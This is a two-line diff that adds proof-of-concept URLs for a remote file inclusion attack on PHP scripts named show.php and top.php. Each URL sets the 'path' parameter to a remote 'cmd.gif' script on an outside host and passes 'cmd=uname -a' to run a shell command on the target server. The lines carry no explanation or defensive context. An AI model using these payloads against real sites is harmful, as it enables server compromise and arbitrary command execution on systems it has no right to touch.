@@ -1,0 +1,2 @@
+http://www.example.com/[path]/show.php?path=http://www.example.com/cmd.gif?&amp;cmd=uname -a
+http://www.example.com/[path]/top.php?path=http://www.example.com/cmd.gif?&amp;cmd=uname -a
